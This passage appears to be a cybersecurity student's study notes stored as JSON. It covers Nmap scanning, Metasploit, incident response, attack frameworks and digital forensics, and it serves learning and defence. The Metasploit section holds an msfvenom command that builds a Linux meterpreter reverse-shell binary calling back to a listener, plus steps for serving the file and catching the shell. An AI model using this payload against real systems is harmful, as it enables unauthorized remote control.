1000-1500\n- `-p-` = Scan all ports\n- `--script` = Activate a script from the nmap scripting library\n- `--script=vuln` = Activate all the scripts in the 'vuln' category\n\n## Scan Types Overview\n\nThree basics scan types when port scanning with Nmap:\n\n1. TCP Connect Scans (`-sT`)\n2. SYN 'Half-open' Scans (`-sS`)\n3. UDP Scans (`-sU`)\n\nAdditionally, there are several less common port scans:\n\n- TCP Null Scans (`-sN`)\n- TCP FIN Scans (`sF`)\n- TCP Xmas Scans (`sX`)\n\nMost of these are used for very similar purposes but differs between each scan.\n\n### TCP Connect Scans\n\nUnderstanding the TCP three-way handshake when doing TCP Connect scans `-sT`.\n\n1. The attacking machine sends a TCP request to the target server with the SYN flag set.\n2. The server acknowledges this packet with a TCP response containing the SYN flag, as well as the ACK flag.\n3. Completes the handshake by sending a TCP request with the ACK flag set.\n\n![handshake](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/image-2.png)\n\nIf the port is closed, the target server will respond with a TCP packet with the _RST (Reset)_ flag set.\n\n- Many firewalls are configured to drop incoming packets. Nmap sends a TCP SYN request, and receives nothing back. This indicates the port is being protected by a firewall and the port is considered to be _filtered_ - if the port is open and hidden behind a firewall\n\n\n### SYN Scans\n\nSYN scans are sometimes referred to as 'half-open' or 'stealth' scans.\n\nTCP scans perform a full three-way-handshake with the target and SYN scans sends back a RST TCP packet after receiving SYN/ACK from the server.\n\n#### Advantages\n\n- Bypass older Intrusion Detection systems as they look for a full three-way-handshake.\n  - No longer the case with modern IDS solutions.\n  - SYN scans are often not logged by applications listening on open ports, as standard practice is to log a connection once it has been fully established.\n- Scans are significantly faster than a standard TCP Connect scan.\n\n#### Disadvantages\n\n- Require sudo permissions to work correctly in Linux. SYN scans require the ability to create raw packets (opposed to the full TCP handshake).\n- Unstable services are sometimes brought down by SYN scans - problematic if a client is a production environment.\n\nAll the pros outweigh the cons since SYN scans are the default scans used by Nmap _if run with sudo permissions_.\n\n### UDP Scans\n\nUnlike TCP, UDP connections are _stateless_. UDP connections rely on sending packets to a target port and essentially hoping they make it.\n\n- UDP is best for connections which rely on speed over quality (e.g. video sharing) but the lack of acknowledgement makes more difficult and slower to scan.\n\nWhen a packet is sent to an open UDP port, there should be no response. Nmap refers to the port as being `open|filtered`.\n\nWhen a packet is sent to a closed UDP port, the target should respond with an ICMP (ping) packet containing a message that the port is unreachable.\n\n### ICMP Network Scanning\n\nPurpose to see which IP addresses contain active hosts, and which do not.\n\nNmap can perform a \"ping sweep\" to send ICMP packet to each possible IP address for the specified network.\n\n- When it receives a response, it marks the IP address that responded as being alive.\n- Perform a ping sweep with `nmap -sn 192.168.0.1-254` on IP ranges specified with a hyphen or CIDR notation.\n  - `-sn` tells Nmap not to scan any ports - forcing it to only ICMP echo packets to identify targets.\n\n## NSE Scripts Overview\n\nThe Nmap Scripting Engine (NSE) is an incredible powerful addition to Nmap. NSE scripts are written in the Lua programming language, and can be used for a variety of things: scanning for vulnerabilities, to automating exploits for them. NSE is useful for reconnaissance and includes many categories:\n\n- `safe` - Will not affect the target\n- `intrusive` - Not safe: likely to affect the target\n- `vuln` - Scan for vulnerabilities\n- `exploit` - Attempt to exploit a vulnerability\n- `auth` - Attempt to bypass authentication for running services\n- `brute` - Attempt to brute force credentials for running services\n- `discovery` - Attempt to query running services for further information about the network\n\nA more detailed list can be found [here](https://nmap.org/book/nse-usage.html).\n\n### Working with the NSE\n\n- `--script=safe` will run any applicable safe scripts against the target or any specified category.\n- To run a specific script, we would use `--script=<script-name>`.\n  - Multiple scripts can be run simultaneously by separating them by a comma.\n\nA full list of scripts and example use cases can be found [here](https://nmap.org/nsedoc/).\n\n### Searching for Scripts\n\nAll of the official scripts on Linux at `/usr/share/nmap/scripts`.\n\n- Use grep to look for scripts: `grep 'ftp' /usr/share/nmap/scripts/script.db`\n- Use `ls`: `ls -l /usr/share/nmap/scripts/*ftp*`\n\n### Installing New Scripts\n\nIt is possible to install the scripts manually by downloading the script from Nmap (`sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse`)\n\n- This must be followed up with `nmap --script-updatedb` which updates the _script.db_ file to contain the new downloaded script.","n":0.03}}},{"i":51,"$":{"0":{"v":"Metasploit","n":1},"1":{"v":"\n# Introduction to Metasploit\n\nMetasploit in the most widely exploitation framework - A powerful tool that can support all phases of penetration testing, from information gathering to post-exploitation.\n\nTwo main versions:\n\n1. **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks.\n2. **Metasploit Framework**: The open-source version that works from the command line.\n\nThe Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more.\n\nThe main components summarized below:\n\n- **msfconsole**: The main command-line interface.\n- **Modules**: Supporting modules such as exploits, scanners, payloads, etc.\n- **Tools**: Stand-alone tools that will vulnerability research, vulnerability assessment, or penetration testing.\n\n## Main Components of Metasploit\n\n**Exploit**\n: A piece of code that uses a vulnerability present on the target system.\n\n**Vulnerability**\n: A design, coding, or logic flaw affecting the target system.\n\n**Payload**\n: An exploit will take advantage of a vulnerability via a payload.

List available workspaces using the `workspace` command.\n\n- Can add a workspace using the `-a` parameter or delete a workspace with `-d` parameter.\n\n### Changing Workspaces\n\n- Switch between workspaces by typing `workspace` followed by the desired workspace name.\n\n#### Workspace Help\n\n- Use `workspace -h` command to list available options for the `workspace` command.\n\n#### Database Backend Commands\n\n- Once Metasploit is launched with a database, the `help` command will show the Database Backends Commands menu.\n\n#### db_nmap Command\n\n- Running Nmap scan with `db_nmap` will save the results to the database.\n\n#### Hosts and Services\n\n- Can reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands.\n\nOnce the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter.\n\n### Vulnerability Scanning\n\nMetasploit allows to quickly identify some critical vulnerabilities that could be considered as \"low hanging fruit\". Usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow access.\n\n`info` command for any module to have a better understanding of its use and purpose.\n\n### Exploitation\n\nMetasploit is an exploitation framework and exploits are the most populated module category.\n\n- Search for exploits using the `search` command.\n- Obtain more information about the exploit using the `info` command.\n- Launch the exploit using `exploit`.\n\nThe process seems simple but a successful outcome depends on a thorough understanding of services running on a target system.\n\n#### Available Payloads\n\nMost of the exploits have a preset default payload.\n\n- Can always use the `show payloads` command to list other commands for that specific exploit.\n- Use `set payload` command to select payload of choice.\n\n#### Background\n\nOnce a session is opened, `CTRL+Z` to background or abort it using `CTRL+C`.\n\n#### Working with Sessions\n\nThe `sessions` command will list all active sessions.\n\n- Interact with any existing session using the `sessions -i` command followed by the session ID.\n\n## Msfvenom\n\nReplaces Msfpayload and Msfencode to generate payloads.\n\n- Msfvenom will allow to access all payloads in the Metasploit framework.\n- Msfvenom allows to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).\n\n### Output Formats\n\n- Can generate stand-alone payloads or get a usable raw format with `msfvenom --list formats`.\n\n### Encoders\n\nEncoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shell code is better solution to the problem.\n\n- Usage of encoding with `-e` parameter.\n\n### Handlers\n\nSimilar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.\n\n- The term commonly used to receive a connection from a target is \"catching a shell\". Reverse shells or Meterpreter callbacks generated in the MSFvenom payload can be easily caught using a handler.\n- Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.\n- Multi Handler to receive the incoming connections with `use exploit/multi/handler` command.\n\n#### Other Payloads\n\nLinux Executable and Linkable Format (elf)\n`msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.13.40.171 LPORT=4444 -f elf > rev_shell.elf`\n\nTransfer to the target machine by starting a Python web serer on attacking machine with `python3 -m http.server 9000` command.

If security controls are insufficient, higher volumes of incidents may occur, overwhelming the incident response team.\n\nRisk Assessment\n: Periodic risk assessments of systems and apps should determine what risk are posed by combinations of threats and vulnerabilities.\n\nHost Security\n: All hosts should be hardened appropriately using standard configurations, adhere to strict ACLs, and be monitored continuously.\n\nNetwork Security\n: The network perimeter should be configured to deny all activity that is not expressly permitted.\n\nMalware Prevention\n: Software to detect and stop malware should be deployed throughout the organization.\n\nUser Awareness and Training\n: Users should be made aware of policies and procedures regarding appropriate use of networks, systems, and applications.\n\n#### Checklist\n\n- Are all members aware of the security policies of the organization?\n- Do all members of the Computer Incident Response Team know whom to contact?\n- Do all incident responders have access to journals and access to incident response toolkit to perform the actual incident response process?\n- Have all members participated in incident response drills to practice the incident response process and to improve overall proficiency on a regularly established basis?\n\n### Detection & Analysis\n\n#### Precursors & Indicators\n\nPrecursors\n: A sign that an incident may occur in the future.\n\n- Web server log entries that show the usage of a vulnerability scanner.\n- An announcement of a new exploit that targets a vulnerability of the organization's mail server.\n- A threat from a group stating that the group will attack the organization.\n\nIndicators\n: A sign that an incident may have occurred or may be occurring now.\n\n- Antivirus software alerts when it detects that a host is infected with malware.\n- A system administrator sees a filename with unusual characters.\n- A host records auditing configuration change in its log.\n- An application logs multiple failed login attempts from an unfamiliar remote system.\n- An email administrator sees a large number of bounced emails with suspicious content.\n- A network administrator notices an unusual deviation from typical network traffic flows.\n\n#### Monitoring Systems\n\n- Monitoring systems are crucial for early detection of threats.\n- These systems are not mutually exclusive and still require an IR team to document and analyze the data.\n\nIDS vs IPS\n: Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) are both parts of the network infrastructure. The main difference between them is that IDS is a monitoring system, while IPS is a control system.\n\nDLP\n: Data loss prevention (DLP) is a set of tools and processes used to ensure that sensitive data is not lost, misused, or accessed by unauthorized users.\n\nSIEM\n: Security Information and Event Management solutions combine Security Event Management (SEM) - which carries out analysis of event and log data in real-time with Security Information Management (SIM).\n\n\n\n#### Documentation\n\nRegardless of the monitoring system, highly detailed, thorough documentation is needed for the current and future incidents.\n\n1. The current status of the incident.\n2. A summary of the incident.\n3. Indicators related to the incident.\n4. Other incidents related to this incident.\n5. Actions taken by all incident handlers on this incident.\n6. Chain of custody, if applicable.\n7. Impact assessments related to the incident.\n8. Contact information for other involved parties.\n9. A list of evidence gathered during the incident investigation.\n10. Comments from incident handlers.\n11. Next steps to be taken (e.g. rebuild the host, upgrade an application).\n\n##### Functional Impact Categories\n\nNone\n: No effect to the organization's ability to provide all services to all users.\n\nLow\n: Minimal effect; the organization can still provide all critical services to all users but has lost efficiency.\n\nMedium\n: Organization has lost the ability to provide a critical service to a subset of system users.\n\nHigh\n: Organization is no longer able to provide some critical services to any users.\n\n##### Information Impact Categories\n\nNone\n: No information was exfiltrated, changed, deleted, or otherwise compromised.\n\nPrivacy Breach\n: Sensitive personally identifiable information (PII) of taxpayers, employees, beneficiaries, etc. was access or exfiltrated.\n\nProprietary Breach\n: Unclassified proprietary information, such as protected critical infrastructure information (PCII), was accessed or exfiltrated.\n\nIntegrity Loss\n: Sensitive or proprietary information was changed or deleted.\n\n##### Recoverability Effort Categories\n\nRegular\n: Time to recovery is predictable with existing resources.\n\nSupplemented\n: Time to recovery is predictable with additional resources.\n\nExtended\n: Time to recovery is unpredictable; additional resources and outside help are needed.\n\nNot Recoverable\n: Recovery from the incident is not possible (e.g, sensitive data exfiltrated and posted publicly); launch investigation.\n\n##### Notifications\n\nAlert anyone that is possibly involved with incident.\n\n- CIO\n- Local and Head of information security\n- Other incident response teams within the organization\n- External incident response teams (if appropriate)\n- System owner\n- Human resources\n- Public affairs\n- Legal department\n- Law enforcement (if appropriate)\n\n### Containment, Eradication & Recovery\n\nContainment is important before an incident overwhelms resources or increases damage. Containment strategies vary based on the type of incident. For example. the strategy for containing an email-born malware infection is quite different from that of a network-based DDoS attack.\n\nAn essential part of containment is decision-making. Such decisions are much easier to make if there are predetermined strategies and procedures for containing the incident.\n\n1. Potential damage to and theft of resources.\n2. Need for evidence preservation.\n3. Service availability.\n4. Time and resources needed to implement the strategy.\n5. Duration of the solution.\n\n#### Forensics in Incident Response\n\nEvidence should be collected according to procedures that meet all applicable laws and regulations that have been developed from previous discussions with legal staff and appropriate law enforcement agencies so that any evidence can be admissible in court. - NIST 800-61\n\n1. Capture a backup image of the system as-is.\n2. Gather evidence.\n3. Follow Chain of Custody protocols.\n\n#### Eradication & Recovery\n\n1. After an incident has been contained, eradication may be necessary to eliminate components of the incident, such as deleting malware and disabling breached user accounts, as well as identifying and mitigating all vulnerabilities that were exploited.\n2. Recovery may involve such actions such as restoring systems from clean backups, rebuilding systems from scratch, replacing compromised files with clean versions, installing patches, changing passwords, and tightening network perimeter security (e.g., firewall rule sets, boundary router access control lists).\n3. High level of testing and monitoring are often deployed to ensure restored systems are no longer impacted by the incident. This could take weeks or months depending on how long it takes to bring back compromised systems into production.\n\n#### Checklist\n\n- Can the problem be isolated? Are all affected systems isolated from non-affected systems? Have forensics copies of affected systems been created for further analysis?\n- If possible, can the system be re-imaged and then hardened with patches and/or other countermeasures to prevent or reduce the risk of attacks? Have all malware and other artifacts left behind by the attackers been removed and the affected systems hardened against further attacks?\n- What tools are you going to use to test, monitor, and verify that the systems being restored to productions are not compromised by the same methods that cause the original incident?\n\nhttps://learn.saylor.org/mod/book/tool/print/index.php?id=29706\n\n### Post-Incident Activity\n\n#### Lessons Learned\n\n- Exactly what happened, and at what times?\n- How well did staff and management perform in dealing with the incident?

Team Model - A coordinating team is a group of the IT professionals that provides an organization with the services and support surrounding the prevention and management and coordination of potential cybersecurity related emergencies.\n   - Small organizations with central incident response team.\n   - Large organization has multiple teams on-site or geographically dispersed.\n2. Team Model Selection - Cost vs. Use in-house employees or partially outsource incident response work to another organization. Common when organization needs a full-time incident response team but does not have enough available qualified employees.\n3. Incident Response Personnel - Members of the incident response team should have good problem-solving skills and critical thinking abilities. It is not necessary for every team member to be a technical expert.\n   - Teamwork\n   - Communication\n4. Incident Response Team Services\n\n### Incident Response Lifecycle\n\n![lifecycle](https://securitynotes.org/wp-content/uploads/2017/09/NIST-incident-response-lifecycle.png)\n\n#### Preparation\n\nIncludes everything an organization does to get ready for incident response, such as putting in place the necessary tools and resources and training the team.\n\n- Activities aimed at preventing incidents from occurring.\n\n#### Detection & Analysis\n\nFinding out what happened.\n\n- The most important thing is to quickly determine the level of damage caused by the incident and pinpoint the source of the problem.\n  - Signs of an incident are categorized as precursors and indicators.\n\nPrecursor\n: A sign that an incident may occur in the future.\n\nIndicator\n: An incident may have occurred, or may be occurring now.\n\n#### Containment, Eradication, and Recovery\n\nAfter identifying the problem, an essential part of containment is decision-making and taking action.\n\n- Incident response is about containing the incident by cutting off its source, eradicating it by eliminating all traces of it, and recovering to normal operations.\n\n#### Post-Event Activity\n\nA summary of what is learned from an incident to prevent similar incidents in the future.\n\n- Collaborate with regulators or law enforcement agencies.\n- Make necessary updates on new plan during an incident response.\n\n## Cyberattack Frameworks\n\nIBM X-Force Incident Response team have developed a comprehensive framework to address all actions attacker takes, empowering security analysts and threat-hunters with insight to narrow risk exposure and increasing cyberattacks.\n\n### IBM X-Force IRIS Cyberattack Framework\n\n![framework](https://securityintelligence.com/wp-content/uploads/2018/07/outside-attack-framework-v2.png)\n\n![framework2](https://securityintelligence.com/wp-content/uploads/2018/08/execution-framework-v4-1.png)\n\n#### Attack Beginnings: Bad Actor sets the Stage\n\nTo determine a target and prepare an attack, the preparation framework examines the steps that cyberattacks move through.\n\n- Attacker determines objective and attacks.\n\nThis stage includes all the known methods that attackers use to advance from target selection to launching their attack to include:\n\n- Conduct external reconnaissance.\n- Align tactics, techniques and procedures (TTPs) to target.\n- Prepare malware and software tools.\n- Prepare attack infrastructure.\n\n##### Defense Tips: Increase Network Security\n\n- Build a threat profile of adversarial actors who are likely to target the company. When building the profile, ask:\n  - Have threat actors targeted the organization?\n  - What type of attacker would be interested in this organization?\n  - Where are these threat groups?\n  - What are the attackers' goals?\n- Take steps to safeguard the assets attackers are likely to target, such as most critical data.\n- Determine whether threat actors have interest in the organization and its assets, intellectual property, customers, or proprietary data.\n- To prevent C&C servers from crafting domains that look legitimate to unsuspecting targets, purchase all the likely typo-changed domains associated with company name, and monitor suspicious domain registrations.\n\n#### Launch and Execute Attack: The Compromise Begins\n\nLaunch Attack\n: Once the attack infrastructure is ready, the attacker launches an attack gainst the target, either directly or indirectly, and defines the attack as successful or failed.\n\nExamples of direct attacks:\n\n- Stolen credentials.\n- Phishing email with a malicious file or domain attached.\n\nExamples of indirect attacks:\n\n- Infection of a work laptop while connected to a home network.\n- Compromise of a website or online advertisement.\n\nAccess Environment\n: Once the attack is determined successful, the attacker will work quickly to establish a foothold.\n\nExecute initial compromise\n: The attacker gains access to at least one host on the network or has logged in to a user's account.\n\nEstablish Foothold\n: The attacker ensures continued access to, and control of, at least one host or user account within the network.\n\n##### More Defense Tips Network Security - Attack Continues / Expand Access\n\n- Harden the attack surface and deter most attackers from viewing the organization as an easy target with methods such as efficient and timely patch management.\n- Include patch management performance metrics in the system adminstration process and use automated checks for patches.\n- Apply the concept of least privilege: Make sure users and systems only have access privileges that correspond with their role; remove excess privileges; and only allow users and systems to perform authorized tasks.\n- To disrupt attacks, implement a strong endpoint detection and mitigation strategies.\n- Employ a threat-hunting program to aid in threat identification and mitigation.\n- Refine threat-hunting program.\n  - As unknown threats are discovered, migrate associated threat indicators as signatures into detection and protection platforms to automatically identify any other instances.\n- Invest in a centralized logging and analysis platform to automatically prioritize data and place it into tiers ranging from benign activities to those likely indicating maliciousness.\n- Whitelist and create a baseline for normal activity, and perform frequency analysis.\n- Enforce strong user password policies by enabling multi-factor authentication (MFA), restricting the ability to use the same password across systems, and storing password hashes in secured locations to prevent password-stealing methods.\n\n#### Attack Gains Strength: Continuous Phases Occur\n\nSome aspects of cyberattacks are continuously present during the attack lifecycle.\n\nOperational Security\n: Throughout attack preparation, operational security represents all the actions attackers take to hide their attack preparations from the victims or cybersecurity defenders.\n\nDefense Evasion and Monitoring\n: Attack activity exists throughout the execution cycle and reflects the efforts bad actors may use to evade detection. Tactics include the use of malicious software designed to disguise the attack presence and data masking.\n\nFeedback Pipeline\n: Exists from the time the attack preparation begins, all the way through the execution stage.\n\n##### More Defense Tips from Attack\n\n- Analyze all network traffic and endpoints, and search often for anomalous behavior to disrupt defense evasions and monitoring tactics.\n- Set up a honeypot- a deceptive file or system designed to trick attackers into accessing it- to trigger an immediate alert to security teams with details regarding the activity on the honeypot, including user information and logged keystrokes.\n- Monitor or restrict unusual data transfers, specifically:\n  - Creation of RAR files, which can be used to exfiltrate information. Investigate spikes in emails to external addresses.\n  - Creation of auto forward rules and new email delegates.\n  - Excessive traffic leaving through file transfer protocol (FTP) or Domain Name Server (DNS).  \n\n#### Attack Objective Execution: Attacker Completes the Mission\n\nExecute Objective\n: Once the execution phases are completed successfully, the attacker moves toward the final goal, which could include disruption through financial or data theft, ideological messaging, or industrial espionage.\n\n##### Defense Tips for Security\n\n- Build and train a dedicated team to respond to security incidents.\n- Practice relevant attack scenarios using tabletop exercises or simulations that mimic a cyberattack.\n- Thoroughly examine available forensics to understand attack details, establish mitigation priorities, provide data to law enforcement and plan risk reduction strategies.\n- Consider an incident response retainer with trusted security partners.\n\n## What is a Breach?\n\nBreach\n: A data breach is the result of another security incident, whether it's an attack by hackers, a careless or malicious insider, or even an accident involving faulty processes or procedures.\n\n- A data breach involves data either belonging to the organization only but more often both inside and outside the organization.\n\n### Organization Only\n\nThis type of breach will cause profits and new business.\n\n### Data Inside and Outside of the Organization\n\nInvolve loss of business revenue and typically legal sanctions.\n\n### Technical Aspects\n\nIsolating network segments, removing malware and limiting system access to downed systems.\n\n### Communications\n\nFederal organization or law enforcement agencies with healthcare data and financial institutions.\n\n### Who should be Involved?\n\n- Management and Technical Incident Response Team\n- Legal personnel\n- Public relations\n\nThe team **MUST** be be defined in the Incident Response Strategy **PRIOR** to a data breach.","n":0.027}}},{"i":60,"$":{"0":{"v":"Digital Forensics","n":0.707},"1":{"v":"\n# Forensics Overview\n\n- [ ] What are digital forensics?\n- [ ] What types of data do forensics deal with?\n- [ ] What is the objective and need for digital forensics?\n- [ ] What are the steps to the forensic process?\n\n- [ ] What are the different types of data?\n- [ ] What are the three steps of data acquisition?\n- [ ] What role does chain of custody have in data collection?\n- [ ] What obstacles are faced during examination?\n\n- [ ] Review considerations when conducting an analysis.\n- [ ] Learn about the components that make up a forensic report.\n---\n\n## What are Forensics?\n\nDigital Forensics\n: Also known as computer and network forensics, has many definitions. Generally, it is considered the application of science to the identification, collection, examination, and analysis of data while preserving the integrity of the information and maintaining a strict chain of custody for the data.\n\n### Types of Data\n\nThe first step in the forensic process is to identify potential sources of data and acquire data from them. The most obvious and common sources of data are desktop computers, servers, network storage devices, and laptops.\n\n1. CDs/DVDs\n2. Internal & External Drives\n3. Volatile data\n4. Network Activity\n5. Application Usage\n6. Portable Digital Devices\n7. Externally Owned Property\n8. Computer at Home Office\n9. Alternate Sources of Data\n10. Logs\n11. Keystroke Monitoring\n\n### Need for Forensics\n\n- Criminal Investigation\n- Incident Handling\n- Operational Troubleshooting\n- Log Monitoring\n- Data Recovery\n- Data Acquisition\n- Due Diligence/Regulatory Compliance\n\n## Objectives of Digital Forensics\n\n- Helps to recover, analyze, and preserve computer and related materials in such a manner that i helps the investigation agency to present them as evidence in a court of law. IT helps to postulate the motive behind the crime and identity of the main culprit.\n- Designing procedures at as suspected crime scene which helps you to ensure that the digital evidence obtained is not corrupted.\n- Data acquisition and duplication: Recovering deleted files and deleted partitions from digital media to extract the evidence and validate them.\n- Helps you to identify the evidence quickly, and also allows you to estimate the potential impact of the malicious activity on the victim.\n- Producing a computer forensic report which offers a complete report on the investigation process.\n- Preserving the evidence by following the chain of custody.\n\n## Forensic Process\n\nCollection\n: Identify, label, record and acquire data from the possible sources, while preserving the integrity of the data.\n\nExamination\n: Processing large amounts of collected data to assess and extract data of particular interest.\n\nAnalysis\n: Analyze the results of the examination, using legally justifiable methods and techniques.\n\nReporting\n: Reporting the results of the analysis.\n\n### Data Collection & Examination - Steps to Collect Data\n\n- Develop a plan to acquire the data.\n  - Create a plan that prioritizes the sources, establishing the order in which the data should be acquired.\n- Acquire the Data.\n  - Use forensic tools to collect the volatile data, duplicate non-volatile data sources, and securing the original data sources.\n- Verify the integrity of the data.\n  - Forensic tools can create hash values for the original source so the duplicate can be verified as being complete and un-tampered with.\n\n#### Chain of Custody\n\nA clearly defined chain of custody should be followed to avoid allegations of mishandling or tampering of evidence. This involves keeping a log of every person who had physical custody of the evidence, documenting the actions that they performed on the evidence and at what time, storing the evidence in a secure location when it is not being used, making a copy of the evidence and performing examination and analysis using only the copied evidence, and verifying the integrity of the original and copied evidence.\n\n#### Examination\n\nBypassing Controls\n: Operating systems and applications may have data compression, encryption, or ACLs\n\nA Sea of Data\n: Hard drives may have hundreds of thousands of files, not all of which are relevant.\n\nTools\n: There are various tools and techniques that exist to help filter and exclude data from searches to expedite the process.\n\n### Analysis & Reporting\n\nThe analysis should include identifying people, places, items, and events, and determining how these elements are related so that a conclusion can be reached.\n\n- **Putting the pieces together** - Coordination between multiple sources of data is crucial in making a complete picture of what happened in the incident. NIST provides the example of an IDS log linking an event to a host, the host audit logs linking the event to a specific user account, and the host IDS log indicating what actions that user performed.\n\n#### Solved with Forensics\n\n- **BTK Killer, Dennis Rader** - A floppy disk Rader sent to police revealed his true identity.\n- **Dr. Conrad Murray's lethal prescriptions** - Investigators discovered documentation on Dr. Murray's computer showing his authorization of lethal amounts of the drugs.\n- **The Craigslist Killer, Phillip Markoff** - Investigators tracked the IP address from the emails used in the Craigslist correspondence.\n\n#### Writing Forensic Report\n\nA case summary is meant to form the basis of opinions. While there are a variety of laws that relate to expert reports, the general rules are:\n\n- If it is not in your report, you cannot testify about it.\n- Your report needs to details the basis for your conclusions.\n- Details every test conducted, the methods and tools used, and the results.\n\n##### Report Composition\n\n1. Overview/Case Summary\n2. Forensic Acquisition & Examination Preparation\n3. Findings & Report (Analysis)\n4. Conclusion\n\n[Intro to Report Writing for Digital Forensics Example](https://www.sans.org/blog/intro-to-report-writing-for-digital-forensics/)\n\n##### SANS Institute - General Best Practices\n\n1. Take screenshots\n2. Bookmark evidence via forensic application of choice\n3. Use built-in logging/reporting options within your forensic tool\n4. Highlight and exporting data items into .csv or .txt files\n5. Use a digital audio recorder vs. handwritten notes when necessary\n\nAccording to the former director of the Defense Computer Forensics Laboratory, Ken Zatyko, digital forensics includes:\n\n- **Proper search authority**: Investigators cannot commence without the proper legal authority.\n- **Chain of custody**: Necessary to keep track of who was holding the evidence at any time.\n- **Use of validated tools**: Tools used in digital forensics should be validated to ensure they work correctly.\n  - Creating an image of a disk should ensure the forensic image is identical to the data on the disk.\n- **Repeatability**: The findings of digital forensics can be reproduced with the proper skills and tools are available.\n- **Reporting**: Investigation is concluded with a report that shows the evidence related to the case that was discovered.","n":0.031}}},{"i":61,"$":{"0":{"v":"Data","n":1},"1":{"v":"\n# Data Files\n\n- [ ] Learn about the different file systems.\n- [ ] Learn what method are used for gathering and preserving the integrity of files.\n- [ ] Learn about what metadata from files can be useful.\n- [ ] Learn what techniques forensic tool-kits can perform for data analysis.\n\n- [ ] Learn about the different volatile and non-volatile data in Operating Systems.\n- [ ] Learn about the different Operating Systems.\n- [ ] Learn about what log information may be useful.\n\n- [ ] Learn about the different components of an application and how they are meaningful to a forensic analyst.\n- [ ] Learn about the different types of applications that provide meaningful forensic data.\n- [ ] Learn what considerations are taken when collecting application data.\n\n- [ ] Review TCP/IP basics and how it relates to forensics.\n- [ ] Learn about the different sources of network traffic.\n- [ ] Learn about examining and analyzing network traffic.\n\n\n---\n\nA file can be of many data types, including a document, an image, a video, or an application. Successful forensic processing computer media depends on the ability to collect, examine, and analyze the files that reside on the media. - *NIST 800-86*\n\n## File Systems\n\nA file system defines the way that files are named, stored, organized, and accessed on logical volumes.\n\n### Windows\n\nWindows is a widely used OS designed by Microsoft. The file systems used by Windows:\n\n- FAT\n  - 12\n  - 16\n  - 32\n- NTFS\n- ReFS\n\nInvestigators can search out evidence by analyzing the following important locations of Windows:\n\n- Recycle Bin\n- Registry\n- Thumbs.db\n- Files\n- Browser History\n- Print Spooling\n\n### UNIX\n\n- EXT\n  - 2\n  - 3\n  - 4\n- ReiserFS\n- XFS\n- JFS\n- Btrfs\n\n### macOS\n\nMac OS X is the UNIX-based operating system that contains a Mach 3 micro-kernel and a FreeBSD based subsystem. Its user interface is Apple like, whereas the underlying architecture is UNIX like.\n\n- Mac OS X offers a novel technique to create a forensic duplicate. To do so, the perpetrator's computer should be placed into a \"Target Disk Mode.\" Using this mode, the forensic examiner creates a forensic duplicate of perpetrator's hard disk with the help of a FireWire cable connection between the two PCs.\n\n- HFS+\n- APFS\n\n### Linux\n\nLinux is an open source, UNIX-like, ad elegantly designed operating system that is compatible with personal computers, supercomputers, server, mobile devices, netbooks, and laptops.\n\n- Unlike other OSs, Linux holds many file systems of the ext family, including ext2, ext3, and ext4.\n- Linux can provide an empirical evidence if the Linux embedded machine is recovered from a crime scene. In this  case, forensic investigators should analyze the following folders and directories.\n  - `/etc[%SystemRoot%/System32/config]` contains system configurations directory that holds separate configuration files for each application.\n  - `/var/log` directory contains application logs and security logs (kept for 4-5 weeks).\n  - `/home/$USER` holds user data and configuration information.\n  - `/etc/passwd` has user account information.\n\n### What is not There\n\n- **Deleted files** - When a file is deleted, it is typically not erased from the media; instead, the information in the directory's data structure that points to the location of the file is marked as deleted.\n- **Slack Space** - If a file requires less space than the file allocation unit size, an entire file allocation unit is still reserved for the file.\n - **Free Space** - Free space is the area on media that is not allocated to any partition. The free space may still contain pieces of data.\n - **MAC Data** - Important to know as much information about relevant files as possible. Recording the Modification, Access, and Creation times of files allows analysts to help establish a timeline of the incident.\n    1. Modification Time\n    2. Access Time\n    3. Creation Time\n\n## Logical Backup\n\nA logical backup copies the directories and files of a logical volume. It does not capture other data that may be present on the media, such as deleted files or residual data stored in slack space.\n- Can be used on live system if using a standard backup software.\n- May be resource intensive.\n\n## Imaging\n\nGenerates a bit-for-bit copy of the original media, including free space and slack space. Bit stream images require more storage space and take longer to perform logical backups.\n- If evidence is needed for legal or HR reasons, a full bit stream image should be taken, and all analysis done on the duplicate.\n- Disk-to-Disk vs Disk-to-File\n- Should not be used on a live system since data is always changing.\n\n## Tools for Techniques\n\nMany forensic products allow the analyst to perform a wide range of processes to analyze files and application, as well as collecting files, reading disk images, and extracting data from files.\n\n1. File Viewers\n2. Un-compressing files\n3. GUI for Data Structures\n4. Identifying Known Files\n5. String Searches & Pattern Matches\n6. Metadata\n\n## Operating System Data\n\n> OS data exists in both non-volatile and volatile states. Non-volatile data refers to data that persists even after a computer is powered down, such as a filesystem stored on a hard drive. Volatile data refers to data on a live system that is lost after a computer is powered down, such as the current network connections to and from the system. - *NIST 800-86*\n\n### Volatile\n\n- Slack Space\n- Free Space\n- Networking Configuration/Connections\n- Running Processes\n- Open Files\n- Login Sessions\n- Operating System Time\n\n#### Collection & Prioritization of Volatile Data\n\n1. Network Connections\n2. Login Sessions\n3. Contents of Memory\n4. Running Processes\n5. Open Files\n6. Network Configuration\n7. Operating System Time\n\n### Non-Volatile\n\n- Configuration Files\n- Logs\n- Application files\n- Data Files\n- Swap Files\n- Dump Files\n- Hibernation Files\n- Temporary Files\n\n#### Collecting Non-Volatile Data\n\n1. Consider Power-Down Options\n2. File System Data Collected\n3. Users and Groups\n4. Passwords\n5. Network Shares\n6. Logs\n   - Other logs can be collected depending on the incident under analysis.\n     1. Network Hack - Collect logs of all the network devices lying in the route of the hacked device and the perimeter router (ISP router). firewall rule base may also be required in this case.\n     2. Unauthorized Access - Save the web server logs, application server logs, application logs, router or switch logs, firewall logs, database logs, IDS logs etc.\n     3. Trojan / Virus / 